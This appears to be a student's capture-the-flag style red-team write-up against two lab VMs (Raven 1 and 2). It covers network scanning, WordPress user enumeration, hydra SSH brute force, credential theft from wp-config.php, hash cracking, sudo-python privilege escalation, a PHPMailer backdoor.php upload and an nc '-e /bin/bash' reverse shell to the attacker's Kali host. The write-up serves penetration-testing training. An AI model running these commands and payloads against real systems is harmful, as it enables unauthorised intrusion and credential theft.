# Final-Project
# Red Team: Summary of Operations

## Network Diagram

![NetworkDiagram](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/NetworkDiagram.png )

### Network Scan
#### netdiscover

Netdiscover is a simple ARP scanner which can be used to scan for live hosts in a network.
The netdiscover gathers all the important information about the network. It gathers information about the connected clients and the router. It tells the IP, MAC address and the operating system of the connected clients.

Scanned the network to find the Subnet using netdiscover and IP of the Target 1

`netdiscover`

Output Screenshot:

![Netdiscover scan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/netdiscover.png "Netdiscover scan results")


#### nmap subnet

Nmap is short for Network Mapper. It is an open-source Linux command-line tool that is used to scan IP addresses and ports in a network and to detect installed applications. Nmap finds which devices are running on the network, discover open ports and services, and detect vulnerabilities.

`nmap 192.168.1.0/24`

![nmapsubnet](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nmapsubnet.png "nmapsubnet")

#### Description of Targets

- Two VMs on the network were vulnerable to attack: `Target 1 (192.168.1.110) and Target 2 (192.168.1.115)`

This scan identified the following machines and the corresponding IP addresses:

| IP | Machine |
|:-------------:|:-------------:|
| 192.168.1.1 | Hyper-V, Gateway IP |
| 192.168.1.100 | Capstone Machine |
| 192.168.1.105 | ELK server  |
| 192.168.1.110 | Target 1, Raven 1 |
| 192.168.1.115 | Target 2, Raven 2 |
| 192.168.1.90 | Kali, Pentester|


### Target1

### Exposed Services
Nmap scan results for each machine revealed the below services and OS details:

Command: `$ nmap -sV -v -p- 192.168.1.110`

Output Screenshot:

![Nmap scan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nmaptarget1.png "Nmap scan results")

This scan identifies the services below as potential points of entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn


### Explotation

Since Target 1 is a webserver hosting a WordPress site. Used `wpscan` which is a WordPress vulnerability scanner, a penetration testing tool used to scan for vulnerabilities on WordPress-powered websites. 

**wpscan**
- Exploit Used:
    - Enumerated WordPress site: WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
            - ``` wpscan --url http://192.168.1.110/wordpress --enumerate u ```
            
 ![wpscan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/wpscan.png "wpscan results")

Identified following users with wpscan:
   - **Steven**
   - **Michael**
  
  ![users results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/users.png "users results")
  
 - Brute force user's password using hydra.
 
 Hydra is an open-source tool that allows us to perform various kinds of brute force attacks using wordlists.
 
 ``$ hydra -l michael -P /usr/share/wordlists/rockyou.txt -s 22 -f -vV 192.168.1.110 ssh``

- SSH to gain access to user shell.

    - Brute Force attack to guess/finds Michael’s password
          - Password: michael
     
    - Command: 
             - ``` ssh michael@192.168.1.110 ```
            
 ![michaelssh results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/michaelssh.png "michaelssh results")

    
    
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
          - `cd var/www/html`
          - `grep -rl 'flag1`
          - `nano service.html`

![Flag 1 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag1grep.png "Flag 1 location")

![Flag 1](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag1.png "Flag 1")

 **Flag2**
- Exploit Used:
          - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found
          - Flag 2 was found in `/var/www`
- Commands:
           -  `ssh michael@192.168.1.110` 
           -  `pw: michael`
           -  `locate *flag*.txt `
           -  `cat flag2.txt`
       

![Flag 2 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag2.png "Flag 2 location")

![Flag 2 cat](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag2cat.png "Flag 2 cat")

- **Accessing MySQL database**

My sql password
For Mysqlpassword located ```wp-config.php``` file.

![wp-config cat](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/Wp-config.png "wp-config")

The MySql password was given in the wp-config.php file.

![Mysql password ](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/Mysqlpasswd.png "Mysql password")

Accessed the Mysql database using the following command:
 
- ```mysql -u root -p wordpress```
 
-  Used password ``R@v3nSecurity``
 
![Mysql login ](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mysqllogin.png "Mysql login")

- **Flag3**
         - Exploit Used:
               - Capturing Flag 3: 
                       - Flag 3 was found in wp_posts table in the wordpress database.
               - Commands:
                     - ```show tables;```
                     - ```select * from wp_posts;```

![tables ](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/tables.png "tables")


![Flag 3 flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3flag4.png "Flag 3 flag4")

Got hashed passwords of both the users `Michael` and `Steven` from the users table.

- ```select * from wp_users;```

![Users](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/userstable.png "Users")

Created a wp_hashes.txt with Steven and Michael's hashes,cracked the password hashes with `john`.

On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - ```john wp_hashes.txt```

![john](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/john.png "john")

Secured a user ``Steven`` shell as the user whose password cracked as ``pink84``.



![stevenssh](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/stevenssh.png "stevenssh")

**Privilege escalation using Python**

Escalated to root, using the python script

`sudo python -c 'import pty;pty.spawn("/bin/bash")' `

![python](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/python.png "python")

Once escalated to root 
   - Commands
           - `cd /root`
           - `ls`
           - `cat flag4.txt`

- **Flag4: 715dea6c055b9fe3337544932f2941ce**


       
![Flag 4 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag4.png "Flag 4")

The following vulnerabilities were  identified on target1:

**Target 1 Vulnerabilities**
1. Open port 22
2. Weak User Password
3. Directory Browsing 
4. wp_config.php hack
5. Mysql database revealed
6. Unsalted User Password Hash (WordPress database)
7. Misconfiguration of User Privileges/Privilege Escalation

---
## Target2
Target 2's IP Address: `192.168.1.115`

Enumerated the web server with nikto.

Nikto is a web server scanner which performs vulnerability scanning against web servers for multiple items including dangerous files and programs, and checks for outdated versions of web server software. It also checks for server configuration errors and any possible vulnerabilities they might have introduced.

 `nikto -C all -h 192.168.1.115`
 
 Nikto revealed that the Directory Indexing was enabled on the web server (OSVDB 3268)
 
This created a list of URLs the Target HTTP server exposes. This server is running Apache Server.


![nikto location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nikto.png "nikto")

Performed a more in-depth enumeration with gobuster.

Installed gobuster using apt 

 - `apt-get install gobuster`

![Gobuster install](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobusterinstall.png "gobusterinstall")

Scanned the website (-u http://192.168.1.115/) for directories using a wordlist (-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt) :

 - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u “http://192.168.1.115” `

![Gobuster](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobuster.png "gobusterinstall")

Found a flag in  the /vendor directory. 

![vendor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/vendor.png "vendor")

**Flag1**

![flag1vendor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flaginvendor.png "flag1vendor")


Used searchsploit to find any known vulnerabilities associated with the programs found in Step

 - `searchsploit –h`
Used the provided script exploit.sh to exploit the vulnerability.
Edited the line at the top of the exploit.sh script to set the `TARGET`variable. Set it equal to the IP address of Target 2 `192.168.1.115`.

![Edit exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploitedit.png "exploit")   

Ran the script. It uploaded a file called backdoor.php to the target server. This file was used to execute command injection attack by opening an Ncat connection to the Kali VM.

![exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploitsh.png "exploit")   



Navigate to: `http://192.168.1.115/backdoor.php?cmd=ls`

This allowed to run bash commands on Target 2.

![backdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/backdoor.png "backdoor")   

Used the backdoor to open a shell session on the target 2.

On the Kali VM, started a netcat listener using command : 

 - `nc -lnvp 4444 `
![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nclistener.png "listener")   


In the browser, used the backdoor to run: 

 - ``nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.``
    
   ![listenerbackdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listenerbackdoor.png "listener")     
    
   ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   

Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
    
Command:
   - `find /var/www -type f -iname 'flag*' `
    
![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3command.png "flag3")     

Opened the flag in the browser window.
   - `http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
   
  **Flag3**
    
  ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3target2.png "flag3")     

- Used Metasploit options for a successful attack against phpmailer.
- Got a meterpreter shell from the vulnerable machine.
- The PHPMailer exploit was fairly straightforward. `CVE-2016-10045` describes the details of the vulnerability. 

   
   ![msfconsole](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/msfconsole.png "msfconsole")   
    
   Used option 1 and got access to the mailer.
    
 ![mailer](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mailer.png "mailer")   
    
   Used the python script and su root to escalate the privilges to the root user.
      - ` python -c 'import pty;pty.spawn("/bin/bash")' `
      -  `su root`
      - `passwd:toor`
    
   ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/Flag4target2.png "flag4")    
   
   Got root access to traget to, via directory traversal accessed the flag 4
   
   **Flag4**
    
      - `cat flag4.txt`
    
   
   ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/catflag4.png)  
        
   ![Offensive Analysis of a Vulnerable network](https://docs.google.com/presentation/d/1wsYigHq6z70rpho4xjhpJgIZODBL7Pcv5vIXuY4_NYU/edit?usp=sharing)
    
    
    
